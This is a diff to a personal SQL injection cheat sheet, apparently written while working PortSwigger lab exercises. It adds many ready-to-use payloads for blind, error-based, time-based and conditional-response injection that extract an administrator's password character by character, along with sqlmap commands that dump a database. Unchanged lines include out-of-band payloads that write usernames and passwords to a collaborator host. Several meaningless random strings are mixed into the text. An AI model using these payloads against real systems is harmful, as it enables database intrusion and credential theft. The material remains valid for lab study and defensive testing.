@@ -123,9 +123,12 @@ SLEEP(10)  --> MySQL
 
 #### BLIND BASED
 
+xndadtelc04uaomhrcnb
+#### CONDITIONAL ERROR
+
 ```sql
--- oracle --
-foo'||(select '' from dual)||'  -- no error
+foo'||(select '' )||' -- -'
+foo'||(select '' from dual)||'  -- no error (oracle)
 foo'||(select '' from noexisto)||'  -- error
 foo'||(select '' from users where rownum= 1)||' -- no error? table user exists
 
@@ -134,11 +137,15 @@ foo'||(select '' from users where rownum= 1)||' -- no error? table user exists
 (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator') -- true/false -> /error/noerror 
 (SELECT CASE WHEN LENGTH(password)>10 THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator')
 (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator')
+'||((SELE CT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) )||'
 
 AND 1=CAST((SELECT username FROM users ROWNUM 1) AS int)--
 
 -- EXAMPLE -> TrackingId=test%3b select case when(username='administrator'and length(password)=20)
+```
 
+#### TIME  BLIND
+```sql
 SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
 SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
@@ -148,14 +155,34 @@ SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN
 #### VISIBLE ERROR
 
 ```sql
-'or 1=cast((select 1)as INT) -- -'
-'or 1=cast((select 'a')as INT) -- -'
-'or 1=cast((select username from users limit 1)as INT)-- -'
 
+LIMIT CAST((SELECT version()) as numeric) 
+' AND CAST((SELECT 1) AS int)
+' AND 1=CAST((SELECT 1) AS int)
+' AND 1=CAST((SELECT username FROM users) AS int)-- -'
+' AND 1=CAST((SELECT password FROM users) AS int)-- -'
 
+x' AND (SELECT 'a' FROM users LIMIT 1)='a -- -'
+x' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+x' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='administrator')='a
 
 ```
 
+
+#### CONDITIONAL RESPONSES (e.g Welcome back!)
+
+```sql
+
+' AND 1=1 -- -
+' AND (SELECT 'a')='a' -- -
+' AND (SELECT 'a')='b' -- -
+' AND (SELECT 'a' from users where username='administrator')='a' -- -
+' AND (SELECT 'a' from users where username='<USERNAME>')='a' -- -
+' AND (SELECT substring(username,1,1) from users where username='administrator')='a' -- -
+' AND (SELECT substring(username,1,1) from users where username='administrator' and length(password)>10)='a' -- -
+' AND (SELECT substring(password,1,1) from users where username='administrator')='a' -- -
+```
+tsle2lakv2lihhdbpznv
 #### OUT-OF-BAND
 
 ```sql
@@ -180,7 +207,7 @@ SELECT LOAD_FILE('\\\\<COLLAB_DOMAIN>\\<FILENAME>');
 -- OOB -> WRITE FILES 
 SELECT username, password INTO OUTFILE '\\\\<COLLAB_DOMAIN>\\<FILENAME>';
 ```
-
+t0ollxk7zflx33xxycp6
 #### CONCAT-AND-SUBSTRING
 
 ```sql
@@ -385,7 +412,24 @@ sqlmap -u "https://target.com/filter?category=Pets" \
   --level=5 --risk=3 \
   --batch --threads=10 \
   --sql-query="SELECT password FROM users WHERE username='administrator'"
+
+
+## CUSTOM VISIBLE ERROR
+
+sqlmap -u 'https://0ae400c3049c353f80303ab900620043.web-security-academy.net/filter?category=Pets' \
+--cookie="TrackingId=xyz*; session=abc" \
+-p TrackingId --level 5 --risk 3 --batch --threads=10 --string="Welcome back\!"  --dump
+
+
 ```
+
+```sql
+sqlmap -u "<IP> --cookie='<COOKIE>' \
+--level 5 --risk 3 -p <PARAM> --batch --threads=10
+```
+
+
+
 
 ---
 ```bash
